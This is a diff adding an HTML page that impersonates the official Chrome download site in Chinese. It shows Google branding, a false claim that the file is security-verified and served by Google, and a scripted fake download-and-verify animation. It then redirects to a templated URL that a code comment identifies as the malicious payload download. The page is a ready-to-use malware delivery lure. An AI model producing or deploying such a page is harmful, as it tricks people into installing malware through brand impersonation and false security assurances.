@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chrome 浏览器 - 官方下载</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            padding: 40px;
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+        }
+
+        .logo {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+
+        .title {
+            font-size: 28px;
+            font-weight: 600;
+            color: #202124;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: #5f6368;
+            font-size: 16px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .download-section {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 30px;
+            margin: 30px 0;
+        }
+
+        .version-info {
+            color: #5f6368;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .download-btn {
+            display: inline-block;
+            background: linear-gradient(45deg, #4285f4, #34a853);
+            color: white;
+            text-decoration: none;
+            padding: 16px 32px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(66, 133, 244, 0.3);
+            margin-bottom: 20px;
+        }
+
+        .download-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(66, 133, 244, 0.4);
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #e9ecef;
+            border-radius: 2px;
+            margin: 20px 0;
+            overflow: hidden;
+            display: none;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #4285f4, #34a853);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        .status-text {
+            color: #5f6368;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+
+        .security-notice {
+            background: #e8f5e8;
+            border: 1px solid #c3e6c3;
+            border-radius: 6px;
+            padding: 15px;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #2d5a2d;
+        }
+
+        .security-notice strong {
+            color: #1b4d1b;
+        }
+
+        .footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #e9ecef;
+            color: #5f6368;
+            font-size: 12px;
+        }
+
+        .footer a {
+            color: #4285f4;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        @keyframes download {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.google.com/chrome/static/images/chrome-logo.svg" alt="Chrome Logo" class="logo">
+
+        <h1 class="title">Chrome 浏览器</h1>
+        <p class="subtitle">下载最新版本，享受更安全、更快速的浏览体验</p>
+
+        <div class="download-section">
+            <div class="version-info">
+                版本: 118.0.5993.117 | 文件大小: 64.8 MB
+            </div>
+
+            <a href="{{.URL}}" class="download-btn" id="downloadBtn">
+                <span id="btnText">🚀 开始下载</span>
+            </a>
+
+            <div class="progress-bar" id="progressBar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+
+            <div class="status-text" id="statusText">
+                正在准备下载...
+            </div>
+        </div>
+
+        <div class="security-notice">
+            <strong>🔒 安全下载：</strong>此文件来自 Google 官方服务器，已通过安全验证。下载完成后，请按照安装向导完成更新。
+        </div>
+
+        <div class="footer">
+            <p>
+                需要帮助？访问 <a href="https://support.google.com/chrome" target="_blank">Chrome 帮助中心</a><br>
+                © 2023 Google LLC. All rights reserved.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('downloadBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+
+            const btn = document.getElementById('downloadBtn');
+            const btnText = document.getElementById('btnText');
+            const progressBar = document.getElementById('progressBar');
+            const progressFill = document.getElementById('progressFill');
+            const statusText = document.getElementById('statusText');
+
+            // 显示进度条
+            progressBar.style.display = 'block';
+            statusText.style.display = 'block';
+
+            // 模拟下载进度
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.random() * 15;
+                if (progress > 100) progress = 100;
+
+                progressFill.style.width = progress + '%';
+
+                if (progress < 30) {
+                    statusText.textContent = '正在连接服务器...';
+                } else if (progress < 70) {
+                    statusText.textContent = '正在下载文件...';
+                } else if (progress < 90) {
+                    statusText.textContent = '正在验证文件...';
+                } else {
+                    statusText.textContent = '下载完成！';
+                }
+
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    btnText.textContent = '✅ 下载完成';
+                    btn.style.background = 'linear-gradient(45deg, #34a853, #4285f4)';
+
+                    // 3秒后自动开始"安装"
+                    setTimeout(() => {
+                        statusText.textContent = '正在启动安装程序...';
+                        setTimeout(() => {
+                            // 这里会触发实际的恶意载荷下载
+                            window.location.href = '{{.URL}}';
+                        }, 1000);
+                    }, 3000);
+                }
+            }, 200);
+        });
+    </script>
+</body>
+</html>
